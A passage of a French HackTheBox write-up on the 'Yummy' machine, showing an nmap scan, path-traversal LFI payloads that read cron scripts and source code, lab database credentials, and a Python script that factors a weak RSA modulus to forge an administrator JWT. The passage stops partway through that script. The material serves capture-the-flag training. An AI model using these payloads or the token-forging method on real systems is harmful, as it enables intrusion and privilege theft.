<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Yummy</title>
<meta name=description content="Platforme: HackTheBox Lien: Yummy Niveau: Difficile OS: Linux Yummy présente une surface d&amp;rsquo;attaque relativement réduite. Une vulnérabilité de type Local …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-yummy/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Yummy"><meta property="og:description" content="Platforme: HackTheBox Lien: Yummy Niveau: Difficile OS: Linux Yummy présente une surface d&amp;rsquo;attaque relativement réduite. Une vulnérabilité de type Local …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Yummy/Yummy.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Yummy/Yummy.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Yummy"><meta name=twitter:description content="Platforme: HackTheBox Lien: Yummy Niveau: Difficile OS: Linux Yummy présente une surface d&amp;rsquo;attaque relativement réduite. Une vulnérabilité de type Local …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-yummy/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-yummy/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Yummy/Yummy.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-yummy/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-yummy/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Yummy</h1><small role=doc-subtitle></small><p class=post-date>12 min read |
<span class=post-date>22 Février 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: HackTheBox</li><li>Lien: <a href=https://app.hackthebox.com/machines/Yummy>Yummy</a></li><li>Niveau: Difficile</li><li>OS: Linux</li></ul><hr><p>Yummy présente une surface d&rsquo;attaque relativement réduite. Une vulnérabilité de type Local File Inclusion (LFI) permet d&rsquo;accéder au code source de l&rsquo;application. L&rsquo;examen du code révèle une faible sécurité des clés RSA pour l&rsquo;authentification JWT, permettant la création de jetons avec des privilèges plus élevés.</p><p>Une énumération plus poussée du tableau de bord de l&rsquo;administrateur conduit à la découverte d&rsquo;une vulnérabilité d&rsquo;injection SQL dans la fonction de recherche. Combinée au privilège <code>FILE</code>, cette vulnérabilité nous permet d&rsquo;écrire du contenu dans des fichiers sur le système, ce qui conduit à l&rsquo;exécution de code à distance (RCE).</p><p>L&rsquo;escalade des privilèges est réalisée à travers plusieurs pivots: l&rsquo;exploitation d&rsquo;un cron job, l&rsquo;extraction des informations d&rsquo;identification dans un fichier binaire, et l&rsquo;exploitation de Mercurial (<code>hg pull</code>) via des hooks. Enfin, l&rsquo;accès root est obtenu en abusant des privilèges sudo sur <code>rsync</code>, permettant une synchronisation de fichiers sans restriction avec des privilèges élevés.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Yummy {TARGET_IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-02-19 11:42 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.140.209
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.053s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    Caddy httpd
</span></span><span style=display:flex><span>|_http-server-header: Caddy
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://yummy.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 9.58 seconds
</span></span></code></pre></div><p>Nous découvrons deux ports ouverts:</p><ul><li>22 - SSH</li><li>80 - http</li></ul><p>Il y a aussi une redirection vers <code>yummy.htb</code>.</p><pre tabindex=0><code>sudo echo &#34;{TARGET_IP} yummy.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>À <code>http://yummy.htb/</code>, nous trouvons le site web d&rsquo;un restaurant.</p><p><img src=/images/HTB-Yummy/yummy_website.png alt="Yummy website"></p><p>Nous pouvons créer un compte à l&rsquo;adresse <code>http://yummy.htb/register</code> et nous connecter à <code>http://yummy.htb/login</code>. Un compte est nécessaire pour accéder à <code>http://yummy.htb/dashboard</code>.</p><p>Après avoir créé et connecté notre compte, nous faisons une réservation à <code>http://yummy.htb/#book-a-table</code> en utilisant le bouton <code>BOOK A TABLE</code>.</p><blockquote><p>La réservation doit être faite avec l&rsquo;email du compte créé, sinon elle n&rsquo;apparaîtra pas sur le tableau de bord.</p></blockquote><p><img src=/images/HTB-Yummy/reserve_table.png alt="Table reservation"></p><p>Sur le tableau de bord de notre compte, nous voyons la réservation, nous pouvons l&rsquo;annuler ou l&rsquo;enregistrer dans un calendrier.</p><p><img src=/images/HTB-Yummy/yummy_dashboard.png alt="Yummy dashboard"></p><p>En essayant l&rsquo;option <code>SAVE iCALENDAR</code>, nous obtenons un fichier <code>.ics</code>. Il s&rsquo;agit d&rsquo;un fichier texte utilisé pour stocker et partager des données de calendrier. Ils suivent la norme iCalendar (<a href=https://datatracker.ietf.org/doc/html/rfc5545>RFC 5545</a>).</p><p><img src=/images/HTB-Yummy/ics_file.png alt="iCalendar file"></p><p>Cette fonction ne semble pas exploitable.</p><h3 id=vulnérabilité-lfi>Vulnérabilité LFI</h3><p>Nous utilisons à nouveau la même option mais interceptons la requête cette fois-ci. Après avoir transmis la première requête (<code>/reminder</code>), nous obtenons une deuxième requête GET vers <code>/export</code>.</p><blockquote><p>Il est nécessaire de répéter le processus de réservation plusieurs fois afin de continuellement exploiter la vulnérabilité LFI.</p></blockquote><p><img src=/images/HTB-Yummy/export_request.png alt="export request"></p><p>Nous découvrons une vulnérabilité LFI en utilisant le payload <code>/export/../../../../etc/passwd</code>.</p><p><img src=/images/HTB-Yummy/LFI_in_export.png alt="LFI vulnerability in /export"></p><p>Nous trouvons deux utilisateurs : <code>dev</code> et <code>qa</code>.</p><p><img src=/images/HTB-Yummy/target_users.png alt="Target users accounts"></p><p>Nous essayons de progresser dans notre énumération en vérifiant des fichiers tels que <code>/proc/self/environ</code> ou <code>proc/x/cmdline</code>. Mais ils donnent tous les deux une erreur <code>500 Internal Server Error</code>.</p><p><img src=/images/HTB-Yummy/proc_environ.png alt="proc environ test"></p><p><img src=/images/HTB-Yummy/proc_cmdline.png alt="proc cmdline test"></p><p>Nous continuons avec le fichier <code>/etc/crontab</code>.</p><p><img src=/images/HTB-Yummy/etc_crontab_LFI.png alt="/etc/crontab file"></p><h4 id=cron-jobs-découverts>Cron jobs découverts</h4><p>Nous trouvons trois cron jobs différents sur la cible.</p><p><img src=/images/HTB-Yummy/etc_crontab.png alt="custom cron jobs"></p><pre tabindex=0><code>*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
</code></pre><p>Examinons le contenu de ces scripts.</p><p><strong>app_backup.sh</strong></p><pre tabindex=0><code>/export/../../../../data/scripts/app_backup.sh
</code></pre><p><img src=/images/HTB-Yummy/app_backup.sh.png alt="app_backup cron job"></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>cd</span> /var/www
</span></span><span style=display:flex><span>/usr/bin/rm backupapp.zip
</span></span><span style=display:flex><span>/usr/bin/zip -r backupapp.zip /opt/app
</span></span></code></pre></div><p>Ce script supprime tout fichier <code>backupapp.zip</code> existant dans <code>/var/www</code> et crée ensuite une nouvelle sauvegarde du répertoire <code>/opt/app</code> au même endroit.</p><p><strong>table_cleaneup.sh</strong></p><pre tabindex=0><code>/export/../../../../data/scripts/table_cleanup.sh
</code></pre><p><img src=/images/HTB-Yummy/table_cleanup.png alt="table cleanup cron job"></p><blockquote><p>Nous récupérons les identifiants mysql <code>chef:3wDo7gSRZIwIHRxZ!</code>.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/sh
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span>/usr/bin/mysql -h localhost -u chef yummy_db -p<span style=color:#98c379>&#39;3wDo7gSRZIwIHRxZ!&#39;</span> &lt; /data/scripts/sqlappointments.sql
</span></span></code></pre></div><p>Ce script se connecte à la base de données MySQL <code>yummy_db</code> en utilisant l&rsquo;utilisateur <code>chef</code> et exécute les commandes SQL trouvées dans <code>/data/scripts/sqlappointments.sql</code>.</p><p><strong>sqlappointments.sql</strong></p><p>Nous pouvons également vérifier les commandes SQL avec le payload <code>/export/../../../../../data/scripts/sqlappointments.sql</code>.</p><p><img src=/images/HTB-Yummy/sqlappointments.png alt="sql_appointments queries"></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#c678dd>TRUNCATE</span> <span style=color:#c678dd>table</span> <span style=color:#e06c75>users</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>TRUNCATE</span> <span style=color:#c678dd>table</span> <span style=color:#e06c75>appointments</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>INSERT</span> <span style=color:#c678dd>INTO</span> <span style=color:#e06c75>appointments</span> (<span style=color:#e06c75>appointment_email</span>, <span style=color:#e06c75>appointment_name</span>, <span style=color:#e06c75>appointment_date</span>, <span style=color:#e06c75>appointment_time</span>, <span style=color:#e06c75>appointment_people</span>, <span style=color:#e06c75>appointment_message</span>, <span style=color:#e06c75>role_id</span>) <span style=color:#c678dd>VALUES</span> (<span style=color:#98c379>&#34;chrisjohnson@email.net&#34;</span>, <span style=color:#98c379>&#34;Chris Johnson&#34;</span>, <span style=color:#98c379>&#34;2024-05-25&#34;</span>, <span style=color:#98c379>&#34;11:45&#34;</span>, <span style=color:#98c379>&#34;2&#34;</span>, <span style=color:#98c379>&#34;No allergies, prefer table by the window&#34;</span>, <span style=color:#98c379>&#34;customer&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>SNIP</span><span style=color:#56b6c2>&gt;</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>INSERT</span> <span style=color:#c678dd>INTO</span> <span style=color:#e06c75>appointments</span> (<span style=color:#e06c75>appointment_email</span>, <span style=color:#e06c75>appointment_name</span>, <span style=color:#e06c75>appointment_date</span>, <span style=color:#e06c75>appointment_time</span>, <span style=color:#e06c75>appointment_people</span>, <span style=color:#e06c75>appointment_message</span>, <span style=color:#e06c75>role_id</span>) <span style=color:#c678dd>VALUES</span> (<span style=color:#98c379>&#34;michaelsmith@domain.edu&#34;</span>, <span style=color:#98c379>&#34;Michael Smith&#34;</span>, <span style=color:#98c379>&#34;2024-11-05&#34;</span>, <span style=color:#98c379>&#34;20:45&#34;</span>, <span style=color:#98c379>&#34;2&#34;</span>, <span style=color:#98c379>&#34;Need a socket for laptop charging&#34;</span>, <span style=color:#98c379>&#34;customer&#34;</span>);
</span></span></code></pre></div><p>La commande <code>truncate</code> vide les tables <code>users</code> et <code>appointments</code>. Des données sont aussi insérées dans la table <code>appointments</code> avec des détails de réservation tels que <code>appointment_email</code>, <code>appointment_name</code>, <code>appointment_date</code>, etc.</p><p><strong>dbmonitor.sh</strong></p><pre tabindex=0><code>/export/../../../../data/scripts/dbmonitor.sh
</code></pre><p><img src=/images/HTB-Yummy/dbmonitor.png alt="dbmonitor LFI request"></p><p><img src=/images/HTB-Yummy/dbmonitor2.png alt="dbmonitor script content"></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>timestamp</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/date<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>service</span><span style=color:#56b6c2>=</span>mysql
</span></span><span style=display:flex><span><span style=color:#e06c75>response</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/systemctl is-active mysql<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$response</span><span style=color:#98c379>&#34;</span> !<span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;active&#39;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;{\&#34;status\&#34;: \&#34;The database is down\&#34;, \&#34;time\&#34;: \&#34;</span><span style=color:#e06c75>$timestamp</span><span style=color:#98c379>\&#34;}&#34;</span> &gt; /data/scripts/dbstatus.json
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$service</span><span style=color:#98c379> is down, restarting!!!&#34;</span> | /usr/bin/mail -s <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$service</span><span style=color:#98c379> is down!!!&#34;</span> root
</span></span><span style=display:flex><span>    <span style=color:#e06c75>latest_version</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>    /bin/bash <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$latest_version</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> -f /data/scripts/dbstatus.json <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> grep -q <span style=color:#98c379>&#34;database is down&#34;</span> /data/scripts/dbstatus.json 2&gt;/dev/null; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>            /usr/bin/echo <span style=color:#98c379>&#34;The database was down at </span><span style=color:#e06c75>$timestamp</span><span style=color:#98c379>. Sending notification.&#34;</span>
</span></span><span style=display:flex><span>            /usr/bin/echo <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$service</span><span style=color:#98c379> was down at </span><span style=color:#e06c75>$timestamp</span><span style=color:#98c379> but came back up.&#34;</span> | /usr/bin/mail -s <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$service</span><span style=color:#98c379> was down!&#34;</span> root
</span></span><span style=display:flex><span>            /usr/bin/rm -f /data/scripts/dbstatus.json
</span></span><span style=display:flex><span>        <span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>            /usr/bin/rm -f /data/scripts/dbstatus.json
</span></span><span style=display:flex><span>            /usr/bin/echo <span style=color:#98c379>&#34;The automation failed in some way, attempting to fix it.&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>latest_version</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>            /bin/bash <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$latest_version</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>        /usr/bin/echo <span style=color:#98c379>&#34;Response is OK.&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>[</span> -f dbstatus.json <span style=color:#56b6c2>]</span> <span style=color:#56b6c2>&amp;&amp;</span> /usr/bin/rm -f dbstatus.json
</span></span></code></pre></div><p>Ce script surveille le service MySQL et effectue des actions de restauration s&rsquo;il est interrompu:</p><ul><li>Enregistre les temps d&rsquo;arrêt dans <code>/data/scripts/dbstatus.json</code>.</li><li>Envoie des notifications par email lorsque MySQL est hors service ou se rétablit.</li><li>Exécute un script de restauration (<code>fixer-v*</code>) si MySQL s&rsquo;arrête.</li><li>Supprime <code>dbstatus.json</code> lorsque MySQL est de nouveau en ligne.</li></ul><p><strong>Download backupapp.zip</strong></p><p>Nous interceptons la demande obtenue après avoir utilisé la fonction <code>SAVE iCALENDAR</code>, transmettons la première requête (<code>/reminder</code>), modifions le payload de la deuxième requête (<code>/export</code>) par l&rsquo;emplacement du fichier <code>backupapp.zip</code> et nous la transmettons pour télécharger le fichier.</p><pre tabindex=0><code>export/../../../../var/www/backupapp.zip
</code></pre><p><img src=/images/HTB-Yummy/backupapp_download3.png alt="backupapp file download"></p><p>Après avoir extrait <code>backupapp.zip</code>, nous obtenons un répertoire <code>opt</code>.</p><p><img src=/images/HTB-Yummy/source_code_files.png alt="source code files"></p><h3 id=revue-du-code>Revue du code</h3><p>Nous pouvons utiliser <code>vscode</code> pour faciliter l&rsquo;analyse du code. Dans <code>app/app.py</code> nous trouvons les mêmes credentials (<code>chef</code>:<code>3wDo7gSRZIwIHRxZ!</code>) et la même base de données (<code>yummy_db</code>) découverts dans le script <code>table_cleanup.sh</code>.</p><p><img src=/images/HTB-Yummy/db_creds_yummy.png alt="creds found in app.py"></p><p>Nous trouvons également toutes les différentes routes présentes dans l&rsquo;application telles que <code>/export</code>, <code>/book</code>, etc. <code>/dashboard</code> est également présent mais nous remarquons qu&rsquo;il y a une redirection vers une nouvelle route <code>/admindashboard</code> si l&rsquo;utilisateur authentifié est <code>administrator</code>.</p><p><img src=/images/HTB-Yummy/redirection_yummy.png alt="Redirection code"></p><p>Le code de la route <code>/admindashboard</code> mentionnée est disponible plus bas.</p><p><img src=/images/HTB-Yummy/admindashboard_code.png alt="admindashboard route code"></p><p>Nous devons donc trouver comment l&rsquo;application détermine si un utilisateur est <code>administrator</code>.</p><p>Elle le fait via la fonction <code>validate_login()</code> dans <code>app.py</code>. Elle vérifie le token de l&rsquo;utilisateur et son rôle. Dans cette fonction, la fonction <code>verify_token()</code> est invoquée.</p><p><img src=/images/HTB-Yummy/validate_login.png alt="validate_login function"></p><p>Le rôle de la fonction <code>verify_token()</code> dans <code>app/middleware/verification.py</code> est d&rsquo;authentifier et de valider le JWT (JSON Web Token). Après avoir fixé la valeur de <code>token</code> à <code>none</code>, elle recherche l&rsquo;en-tête <code>Cookie</code> dans les requêtes et lorsqu&rsquo;elle la trouve, la fonction extrait la valeur du jeton. Elle recherche spécifiquement la clé <code>X-AUTH-Token</code> à l&rsquo;intérieur du cookie et récupère la valeur du jeton associé. Un code de statut <code>401</code> sera retourné avec le message <code>Authentication Token is missing</code> si aucun jeton n&rsquo;est fourni ou si la valeur du jeton ne peut pas être récupérée.</p><p>Lorsqu&rsquo;un token est extrait avec succès, il est décodé avec la méthode <code>jwt.decode</code>, qui utilise la clé publique du module <code>signature</code> (ce module contient un script python appelé <code>signature.py</code>) avec l&rsquo;algorithme <code>RS256</code> spécifié. Les données décodées doivent contenir le rôle de l&rsquo;utilisateur (<code>customer</code> ou <code>administrator</code>) et un email.</p><p><img src=/images/HTB-Yummy/verification_yummy.png alt="verify.py file"></p><p>Le fichier <code>signature.py</code> dans <code>app/config/</code> est un script utilisé pour générer une paire de clés RSA. Il utilise deux nombres premiers aléatoires <code>q</code> et <code>n</code>.</p><p>La sécurité RSA dépend du choix de nombres premiers aléatoires de grande taille pour <code>p</code> et <code>q</code>, de sorte que la factorisation de <code>n = p * q</code> soit infaisable. Ici, <code>q</code> est un nombre premier plus petit (~20 bits) ce qui facilite les attaques par force brute. Lorsque nous trouvons <code>q</code>, <code>p</code> peut être déduit puisque <code>p = n // q</code>, ce qui nous permet de calculer la clé privée. A partir de là, nous pouvons signer nos propres jetons JWT et nous octroyer le rôle <code>administrator</code> pour l&rsquo;escalade des privilèges.</p><p><img src=/images/HTB-Yummy/signature_yummy.png alt="signature.py file"></p><p>Nous allons utiliser un script python pour obtenir un jeton JWT en tant que <code>administrator</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>Crypto.PublicKey</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>RSA</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>cryptography.hazmat.backends</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>default_backend</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>cryptography.hazmat.primitives</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>serialization</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sympy</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>jwt</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>original_jwt</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;PUT YOUR CURRENT JWT TOKEN HERE&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>s</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>original_jwt</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>split</span>(<span style=color:#98c379>&#34;.&#34;</span>)[<span style=color:#d19a66>1</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>()
</span></span><span style=display:flex><span><span style=color:#e06c75>s</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>base64</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>b64decode</span>(<span style=color:#e06c75>s</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;=&#39;</span> <span style=color:#56b6c2>*</span> (<span style=color:#56b6c2>-</span><span style=color:#e5c07b>len</span>(<span style=color:#e06c75>s</span>) <span style=color:#56b6c2>%</span> <span style=color:#d19a66>4</span>))<span style=color:#56b6c2>.</span><span style=color:#e06c75>decode</span>()
</span></span><span style=display:flex><span><span style=color:#e06c75>n</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>int</span>(<span style=color:#e06c75>s</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>split</span>(<span style=color:#98c379>&#39;&#34;n&#34;:&#39;</span>)[<span style=color:#d19a66>1</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>split</span>(<span style=color:#98c379>&#39;&#34;&#39;</span>)[<span style=color:#d19a66>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>e</span> <span style=color:#56b6c2>=</span> <span style=color:#d19a66>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>factors</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sympy</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>factorint</span>(<span style=color:#e06c75>n</span>)  <span style=color:#7f848e># Returns a dictionary of prime factors</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>p</span>, <span style=color:#e06c75>q</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>list</span>(<span style=color:#e06c75>factors</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>keys</span>())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>phi_n</span> <span style=color:#56b6c2>=</span> (<span style=color:#e06c75>p</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>1</span>) <span style=color:#56b6c2>*</span> (<span style=color:#e06c75>q</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>d</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>pow</span>(<span style=color:#e06c75>e</span>, <span style=color:#56b6c2>-</span><span style=color:#d19a66>1</span>, <span style=color:#e06c75>phi_n</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>key</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>RSA</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>construct</span>((<span style=color:#e06c75>n</span>, <span style=color:#e06c75>e</span>, <span style=color:#e06c75>d</span>, <span style=color:#e06c75>p</span>, <span style=color:#e06c75>q</span>))
</span></span><span style=display:flex><span><span style=color:#e06c75>signing_key</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>key</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>export_key</span>()
</span></span><span style=display:flex><span>
